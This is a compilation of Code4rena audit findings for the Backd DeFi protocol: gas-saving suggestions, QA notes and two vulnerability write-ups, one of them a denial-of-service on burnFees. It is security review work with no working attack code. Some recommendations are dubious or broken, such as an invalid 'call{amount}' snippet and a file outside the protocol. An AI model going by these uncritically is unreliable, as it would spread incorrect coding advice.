https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L99 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L104 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L147 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L58 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L136 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L167 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L342 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L408 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L435 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L449 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L469 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L92 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L33 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L62 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L81 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L89 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L63 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L70 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L81 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L216 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L229 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L239 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L256 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/AddressProvider.sol#L278 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L82 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L87  ## Recommended Mitigation Steps  Add payable to these functions for gas savings  # [G-07] Use internal function in place of modifier  An internal function can save gas vs. a modifier. A modifier inlines the code of the original function but an internal function does not.  Source https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#dde7  Many modifiers can use this change https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L27 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L16 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L32 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/AuthorizationBase.sol#L40 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Pausable.sol#L9 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/utils/Pausable.sol#L14 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L47 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L39  ## Recommended Mitigation Steps  Use internal functions in place of modifiers to save gas.  # [G-08] Use newer solidity version  Solidity version 0.8.10 is used. The latest release of solidity includes changes that can provide gas savings. The improvements include:  * Solidity version 0.8.13 can save more gas with [Yul IR pipeline](https://blog.soliditylang.org/2022/03/16/solidity-0.8.13-release-announcement/#yul-ir-pipeline-production-ready)  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#upgrade-to-at-least-084  ## Recommended Mitigation Steps  Use solidity release 0.8.13 with Yul IR pipeline and other improvements for gas savings  # [G-09] Non-public variables save gas  Many immutable variables are public, but changing the visibility of any of these variables to private or internal can save gas.  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L42 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/RewardHandler.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/access/RoleManager.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L28 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/BkdToken.sol#L14 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L19 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L33 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L38 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L26 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L31 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L32 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L36 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L37 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L38 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L44 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/Minter.sol#L55 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/InflationManager.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmGauge.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L30 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/KeeperGauge.sol#L31 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L19 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L20 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L24 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#L25 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/Controller.sol#L21 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L43 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L45 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L46  ## Recommended Mitigation Steps  Declare some public variables as private or internal to save gas  # [G-10] Use calldata instead of memory for function arguments  Using calldata instead of memory for function arguments saves gas sometimes. This can happen when a function is called externally and the memory array values are kept in `calldata` and copied to `memory` during ABI decoding (using the opcode `calldataload` and `mstore`). If the array is used in a for loop, `arr[i]` accesses the value in memory using a `mload`. If calldata is used instead, then instead of going via memory, the value is directly read from `calldata` using `calldataload`. That is, there are no intermediate memory operations that carries this value.  One case of function arguments using memory instead of calldata can use this improvement to save gas https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/FeeBurner.sol#L43  Source https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#use-calldata-instead-of-memory-for-function-parameters  Related DoS issue https://twitter.com/danielvf/status/1519381832592199681  ## Recommended Mitigation Steps  Change function arguments from memory to calldata  # [G-11] Write contracts in vyper  The contracts are all written entirely in solidity. Writing contracts with vyper instead of solidity can save gas.  Source https://twitter.com/eiber_david/status/1515737811881807876  ## Recommended Mitigation Steps  Write some or all of the contracts in vyper to save gas
## More efficient Struct packing of Market in the contract ComptrollerStorage.sol           The following structs could change the order of their stored elements to decrease memory uses.         and number of occupied slots. Therefore will save gas at every store and load from memory.          In ComptrollerStorage.sol, Market is optimized to: 3 slots from: 4 slots. The new order of types (you choose the actual variables):         1. uint256         2. mapping         3. bool         4. bool       ## Unnecessary equals boolean   Boolean variables can be checked within conditionals directly without the use of equality operators to true/false.  ### Code instances:          RoleManager.sol, 137: account == addressProvider.getAddress(AddressProviderKeys._POOL_FACTORY_KEY, false);         BkdTriHopCvx.sol, 169: if (_lpBalance() == 0) return false;         Vault.sol, 647: if (address(strategy) == address(0)) return false;         CvxCrvRewardsLocker.sol, 283: if (IERC20(CVX_CRV).balanceOf(address(this)) == 0) return false;         Vault.sol, 434: if (address(strategy) == address(0)) return false;    ## State variables that could be set immutable  In the following files there are state variables that could be set immutable to save gas.   ### Code instances:          _decimals in LpToken.sol         minter in LpToken.sol         token in StakerVault.sol         minWithdrawalDelay in VaultReserve.sol    ## Unused state variables  Unused state variables are gas consuming at deployment (since they are located in storage) and are  a bad code practice. Removing those variables will decrease deployment gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          Errors.sol, INVALID_TOKEN_TO_REMOVE         AddressProviderKeys.sol, _REWARD_HANDLER_KEY         Errors.sol, ADDRESS_NOT_ACTION         Errors.sol, INVALID_INDEX         InterestRateModel.sol, isInterestRateModel    ## Unused declared local variables  Unused local variables are gas consuming, since the initial value assignment costs gas. And are  a bad code practice. Removing those variables will decrease the gas cost and improve code quality.  This is a full list of all the unused storage variables we found in your code base.   ### Code instances:          PoolMigrationZap.sol, migrate, ethValue_         RewardHandler.sol, burnFees, ethBalance         FeeBurner.sol, _depositInPool, ethBalance_    ## Caching array length can save gas   Caching the array length is more gas efficient. This is because access to a local variable in solidity is more efficient than query storage / calldata / memory. We recommend to change from:          for (uint256 i=0; i<array.length; i++) { ... }  to:       uint len = array.length       for (uint256 i=0; i<len; i++) { ... }   ### Code instances:          StakerVault.sol, actions, 259         InflationManager.sol, stakerVaults, 116         PoolMigrationZap.sol, newPools_, 22         VestedEscrow.sol, amounts, 94         PoolMigrationZap.sol, oldPoolAddresses_, 39    ## Prefix increments are cheaper than postfix increments  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:   ### Code instance:          just change to unchecked: PoolMigrationZap.sol, i, 22    ## Unnecessary default assignment   Unnecessary default assignments, you can just declare and it will save gas and have the same meaning.       ### Code instances:          Vault.sol (L#43) : uint256 internal constant _INITIAL_STRATEGIST_FEE = 0.1e18;         Vault.sol (L#46) : uint256 public constant MAX_PERFORMANCE_FEE = 0.5e18;         Vault.sol (L#42) : uint256 internal constant _INITIAL_RESERVE_FEE = 0.01e18;         CvxCrvRewardsLocker.sol (L#43) : int128 private constant _CRV_INDEX = 0;         Vault.sol (L#44) : uint256 internal constant _INITIAL_PERFORMANCE_FEE = 0;     ## Rearrange state variables  You can change the order of the storage variables to decrease memory uses.  ### Code instances:  In VestedEscrow.sol,rearranging the storage fields can optimize to: 8 slots from: 9 slots. The new order of types (you choose the actual variables):         1. IERC20         2. uint256         3. uint256         4. uint256         5. uint256         6. uint256         7. address         8. bool         9. address  In KeeperGauge.sol,rearranging the storage fields can optimize to: 3 slots from: 4 slots. The new order of types (you choose the actual variables):         1. IController         2. uint256         3. address         4. uint48         5. bool     ## Use bytes32 instead of string to save gas whenever possible       Use bytes32 instead of string to save gas whenever possible.     String is a dynamic data structure and therefore is more gas consuming then bytes32.       ### Code instances:          Errors.sol (L22), string internal constant INVALID_IMPLEMENTATION = "invalid pool implementation for given coin";         Errors.sol (L59), string internal constant FAILED_MINT = "mint failed";         Errors.sol (L62), string internal constant NOTHING_TO_CLAIM = "there is no claimable balance";         Errors.sol (L55), string internal constant UNDERLYING_NOT_SUPPORTED = "underlying token not supported";         Errors.sol (L91), string internal constant STRATEGY_DOES_NOT_EXIST = "Strategy does not exist";    ## Short the following require messages  The following require messages are of length more than 32 and we think are short enough to short them into exactly 32 characters such that it will be placed in one slot of memory and the require  function will cost less gas.  The list:   ### Code instance:          Solidity file: Minter.sol, In line 150, Require message length to shorten: 38, The message: Maximum non-inflation amount exceeded.    ## Use != 0 instead of > 0   Using != 0 is slightly cheaper than > 0. (see https://github.com/code-423n4/2021-12-maple-findings/issues/75 for similar issue)   ### Code instances:          AmmConvexGauge.sol, 171: change 'amount > 0' to 'amount != 0'         StakerVault.sol, 323: change 'balance > 0' to 'balance != 0'         LiquidityPool.sol, 469: change 'underlyingAmount > 0' to 'underlyingAmount != 0'         InflationManager.sol, 602: change 'totalAmmTokenWeight > 0' to 'totalAmmTokenWeight != 0'         Controller.sol, 107: change 'balance > 0' to 'balance != 0'    ## Unnecessary cast        ### Code instances:          IController PoolFactory.sol.constructor - unnecessary casting IController(_controller)         IController LpGauge.sol.constructor - unnecessary casting IController(_controller)         address CompoundHandler.sol._repayAnyDebt - unnecessary casting address(ctoken)         IController LiquidityPool.sol.constructor - unnecessary casting IController(_controller)    ## Use unchecked to save gas for certain additive calculations that cannot overflow   You can use unchecked in the following calculations since there is no risk to overflow:  ### Code instances:          BkdLocker.sol (L#124) - stashedGovTokens[msg.sender].push( WithdrawStash(block.timestamp + currentUInts256[_WITHDRAW_DELAY], amount) );         Minter.sol (L#188) - totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));         AmmGauge.sol (L#89) - ammStakedIntegral_ += (controller.inflationManager().getAmmRateForToken(ammToken) * (block.timestamp - uint256(ammLastUpdated))).scaledDiv(totalStaked);         BkdLocker.sol (L#276) - newBoost += (block.timestamp - lastUpdated[user]) .scaledDiv(currentUInts256[_INCREASE_PERIOD]) .scaledMul(maxBoost - startBoost);         LpGauge.sol (L#69) - poolStakedIntegral_ += (inflationManager.getLpRateForStakerVault(address(stakerVault)) * (block.timestamp - poolLastUpdate)).scaledDiv(poolTotalStaked);    ## Consider inline the following functions to save gas       You can inline the following functions instead of writing a specific function to save gas.     (see https://github.com/code-423n4/2021-11-nested-findings/issues/167 for a similar issue.)       ### Code instances          ScaledMath.sol, scaledDiv, { return (a * DECIMAL_SCALE) / b; }         ExponentialNoError.sol, lessThanOrEqualExp, { return left.mantissa <= right.mantissa; }         Preparable.sol, _prepare, { return _prepare(key, value, _MIN_DELAY); }         AddressProviderHelpers.sol, getSafeRewardHandler, { return provider.getAddress(AddressProviderKeys._REWARD_HANDLER_KEY, false); }         TopUpKeeperHelper.sol, _positionToTopup, { return TopupData(user, position.account, position.protocol, position.record); }    ## Inline one time use functions   The following functions are used exactly once. Therefore you can inline them and save gas and improve code clearness.       ### Code instances:          ExponentialNoError.sol, sub_         BkdTriHopCvx.sol, _minLpAccepted         FeeBurner.sol, _swapperRouter         LiquidityPool.sol, _doTransferIn         CompoundHandler.sol, _getAccountBorrowsAndSupply    ## Cache powers of 10 used several times  You calculate the power of 10 every time you use it instead of caching it once as a constant variable and using it instead.  Fix the following code lines:   ### Code instances:  DecimalScale.sol, 22 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value / 10**(_DECIMALS - decimals);  DecimalScale.sol, 12 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value * 10**(_DECIMALS - decimals);  DecimalScale.sol, 20 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value * 10**(decimals - _DECIMALS);  DecimalScale.sol, 10 : You should cache the used power of 10 as constant state variable since it's used several times (4):              return value / 10**(decimals - _DECIMALS);     ## Change if -> revert pattern to require  Change if -> revert pattern to 'require' to save gas and improve code quality, if (some_condition) {          revert(revert_message)  }  to: require(!some_condition, revert_message)  In the following locations:  ### Code instance:          CTokenRegistry.sol, 62    ## Do not cache msg.sender   We recommend not to cache msg.sender since calling it is 2 gas while reading a variable is more.   ### Code instance:          https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/VestedEscrow.sol#L63  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L103   # Vulnerability details  ## Impact Staking is not stopped even when Gauge is killed. User will not be getting any reward for the staked asset.  ## Proof of Concept 1. Assume the AMMGauge is killed using kill function (AmmGauge.sol#L49). This sets killed as true  2. poolCheckpoint will not further increase ammStakedIntegral and would simply return false  ``` function poolCheckpoint() public virtual override returns (bool) {         if (killed) {             return false;         }   ...   } ```  3. User calls stakeFor function and is still able to stake amount.   4. The drawback will be no rewards as poolCheckpoint will only return false and will not update ammStakedIntegral  ## Recommended Mitigation Steps Add below check in stakeFor function, restricting deposit if Gauge is killed  ``` require(!killed, "Gauge killed"); ```  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/RewardHandler.sol#L50   # Vulnerability details  ## Impact burnFees will fail if none of the pool tokens have underlying token as native ETH token. This is shown below. Since burnFees fails so no fees is deposited in BKDLocker  ## Proof of Concept 1. Assume RewardHandler.sol has currently amount 5 as address(this).balance (ethBalance) (even attacker can send a small balance to this contract to do this dos attack) 2. None of the pools have underlying as address(0) so no ETH tokens and only ERC20 tokens are present 3. Now feeBurner.burnToTarget is called passing current ETH balance of amount 5 with all pool tokens 4. feeBurner loops through all tokens and swap them to WETH. Since none of the token is ETH so burningEth_ variable is false 5. Now the below require condition fails since burningEth_ is false   ``` require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); ```  6. This fails the burnFees function.  ## Recommended Mitigation Steps ETH should not be sent if none of pool underlying token is ETH. Change it to something like below:  ``` bool ethFound=false; for (uint256 i; i < pools.length; i = i.uncheckedInc()) {             ILiquidityPool pool = ILiquidityPool(pools[i]);             address underlying = pool.getUnderlying();             if (underlying != address(0)) {                 _approve(underlying, address(feeBurner));             } else { ethFound=true; }             tokens[i] = underlying;         }  if(ethFound){         feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken); } else { feeBurner.burnToTarget(tokens, targetLpToken); } ```  
## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/utils/Preparable.sol#L143 Function _setConfig: No need to set deadlines[key] = 0; as this was already done in _executeDeadline function  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L218 Function _mint: Check that amount is not equal to zero  ``` amount!=0 ```  Note: do same for mintNonInflationTokens  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/LpGauge.sol#L59 Function claimRewards: Since amount is uint type so amount cannot be <0. Change it to    ``` if (amount == 0) return 0;  ```  Note: Same need to be fixed for other Gauge like AMMGauge  ## https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#L214 Function claimFees: If claimable is zero, no need to go further  ``` require(claimable!=0); ```
## cache in variables instead of loading  ### description   The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas).   ### findings  array lengths should be cached  ``` /2022-05-backd/protocol/contracts/access/RoleManager.sol 82: for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/RewardHandler.sol 42: for (uint256 i; i < pools.length; i = i.uncheckedInc()) { 259: for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 56: for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/InflationManager.sol 116: for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ```  ``` /2022-05-backd/protocol/contracts/tokenomics/VestedEscrow.sol 94: for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ```  ## use calldata instead of memory  ### description  Use calldata instead of memory for function parameters saves gas if the function argument is only read.  ### findings  ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 43: function burnToTarget(address[] memory tokens_, address targetLpToken_) ```  ## named returns and a return statement isn’t necessary  ### description Removing unused named returns variables can reduce gas usage (MSTOREs/MLOADs) and improve code clarity. To save gas and improve code quality: consider using only one of those.  ### findings   ``` /2022-05-backd/protocol/contracts/tokenomics/FeeBurner.sol 47: returns (uint256 received) ```  ## using prefix increments save gas  ### description Prefix increments are cheaper than postfix increments, eg ++i rather than i++  ### findings  ``` /2022-05-backd/protocol/contracts/tokenomics/KeeperGauge.sol 98: epoch++; ```  ## use custom errors  ### description  use custom errors instead of revert strings  If the contract(s) in scope allow using Solidity >=0.8.4, consider using Custom Errors as they are more gas efficient while allowing developers to describe the error in detail using NatSpec.  ### findings  eg ``` /2022-05-backd/protocol/contracts/tokenomics/VestedEscrow.sol 82: require(!initializedSupply, "Supply already initialized once"); ```  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/swappers/SwapperRouter.sol#L280   # Vulnerability details  ## Impact   Usage of deprecated transfer  Swap can revert.   ## Proof of Concept  The original `transfer` used to send eth uses a fixed stipend 2300 gas.   This was used to prevent reentrancy.   However this limit your protocol to interact with others contracts that need more than that to proceess the transaction A good article about that https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Recommended Mitigation Steps  Used call instead.  For example          (bool success, ) = msg.sender.call{amount}("");         require(success, "Transfer failed.");  
**Table of Contents:**  - [[L-01] Unsafe casting may overflow](#l-01-unsafe-casting-may-overflow) - [[L-02] Add constructor initializers](#l-02-add-constructor-initializers) - [[L-03] Deprecated safeApprove() function](#l-03-deprecated-safeapprove-function) - [[L-04] Deprecated approve() function](#l-04-deprecated-approve-function) - [[L-05] Lack of event emission after critical `initialize()` functions](#l-05-lack-of-event-emission-after-critical-initialize-functions) - [[L-06] No account existence check for low-level call](#l-06-no-account-existence-check-for-low-level-call) - [[L-07] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-07-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256) - [[N-01] Unused named returns](#n-01-unused-named-returns)  ## [L-01] Unsafe casting may overflow  SafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting. Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:  ```solidity protocol/contracts/tokenomics/AmmConvexGauge.sol:   208:         ammLastUpdated = uint48(block.timestamp);  protocol/contracts/tokenomics/AmmGauge.sol:    41:         ammLastUpdated = uint48(block.timestamp);   150:         ammLastUpdated = uint48(block.timestamp);  protocol/contracts/tokenomics/KeeperGauge.sol:    49:         lastUpdated = uint48(block.timestamp);   115:         lastUpdated = uint48(block.timestamp); ```  ## [L-02] Add constructor initializers  As per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”  Note that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”  Furthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:  - File: AddressProvider.sol  ```solidity 47:     constructor(address treasury) { 48:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, false); 49:         _addressKeyMetas.set(AddressProviderKeys._TREASURY_KEY, meta.toUInt()); 50:         _setConfig(AddressProviderKeys._TREASURY_KEY, treasury); 51:     } 52:  53:     function initialize(address roleManager) external initializer { 54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true); 55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt()); 56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager); 57:     } ```  - File: LpToken.sol  ```solidity 26:     constructor() ERC20Upgradeable() {} 27:  28:     function initialize( 29:         string calldata name_, 30:         string calldata symbol_, 31:         uint8 decimals_, 32:         address _minter 33:     ) external override initializer returns (bool) { 34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 35:         __ERC20_init(name_, symbol_); 36:         _decimals = decimals_; 37:         minter = _minter; 38:         return true; 39:     } ```  - File: StakerVault.sol  ```solidity 61:     constructor(IController _controller) 62:         Authorization(_controller.addressProvider().getRoleManager()) 63:     { 64:         controller = _controller; 65:         IInflationManager inflationManager_ = controller.inflationManager(); 66:         require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 67:         inflationManager = inflationManager_; 68:         addressProvider = _controller.addressProvider(); 69:     } 70:  71:     function initialize(address _token) external override initializer { 72:         token = _token; 73:     } ```  ## [L-03] Deprecated safeApprove() function  Using this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue #2219 (OpenZeppelin/openzeppelin-contracts#2219). The OpenZeppelin ERC20 safeApprove() function has been deprecated, as seen in the comments of the OpenZeppelin code.  As recommended by the OpenZeppelin comment, I suggest replacing safeApprove() with safeIncreaseAllowance() or safeDecreaseAllowance() instead:  ```solidity protocol/contracts/CvxCrvRewardsLocker.sol:   57:         IERC20(CRV).safeApprove(CRV_DEPOSITOR, type(uint256).max);   60:         IERC20(CVX_CRV).safeApprove(CVX_CRV_STAKING, type(uint256).max);   63:         IERC20(CRV).safeApprove(CVX_CRV_CRV_CURVE_POOL, type(uint256).max);   66:         IERC20(CVX).safeApprove(CVX_LOCKER, type(uint256).max);  protocol/contracts/RewardHandler.sol:   52:         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);   64:         IERC20(token).safeApprove(spender, type(uint256).max);  protocol/contracts/tokenomics/AmmConvexGauge.sol:   61:         IERC20(ammToken).safeApprove(booster, type(uint256).max);  protocol/contracts/tokenomics/FeeBurner.sol:   118:         IERC20(token_).safeApprove(spender_, type(uint256).max);  protocol/contracts/zaps/PoolMigrationZap.sol:   27:             IERC20(underlying_).safeApprove(address(newPool_), type(uint256).max); ```  ## [L-04] Deprecated approve() function  While `safeApprove()` in itself is deprecated, it is still better than `approve` which is subject to a known front-running attack and failing for certain token implementations that do not return a boolean value. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):  ```solidity File: VestedEscrow.sol 24:     constructor(address rewardToken_) { 25:         IERC20(rewardToken_).approve(msg.sender, type(uint256).max); 26:     } ```  ## [L-05] Lack of event emission after critical `initialize()` functions  To record the init parameters for off-chain monitoring and transparency reasons, please consider emitting an event after the `initialize()` functions:  - File: AddressProvider.sol  ```solidity 53:     function initialize(address roleManager) external initializer { 54:         AddressProviderMeta.Meta memory meta = AddressProviderMeta.Meta(true, true); 55:         _addressKeyMetas.set(AddressProviderKeys._ROLE_MANAGER_KEY, meta.toUInt()); 56:         _setConfig(AddressProviderKeys._ROLE_MANAGER_KEY, roleManager); 57:     } ```  - File: BkdLocker.sol  ```solidity 53:     function initialize( 54:         uint256 startBoost, 55:         uint256 maxBoost, 56:         uint256 increasePeriod, 57:         uint256 withdrawDelay 58:     ) external override onlyGovernance { 59:         require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); 60:         _setConfig(_START_BOOST, startBoost); 61:         _setConfig(_MAX_BOOST, maxBoost); 62:         _setConfig(_INCREASE_PERIOD, increasePeriod); 63:         _setConfig(_WITHDRAW_DELAY, withdrawDelay); 64:     } ```  - File: LpToken.sol  ```solidity 28:     function initialize( 29:         string calldata name_, 30:         string calldata symbol_, 31:         uint8 decimals_, 32:         address _minter 33:     ) external override initializer returns (bool) { 34:         require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); 35:         __ERC20_init(name_, symbol_); 36:         _decimals = decimals_; 37:         minter = _minter; 38:         return true; 39:     } ```  - File: StakerVault.sol  ```solidity 71:     function initialize(address _token) external override initializer { 72:         token = _token; 73:     } ```  ## [L-06] No account existence check for low-level call  Low-level calls call/delegatecall/staticcall return true even if the account called is non-existent (per 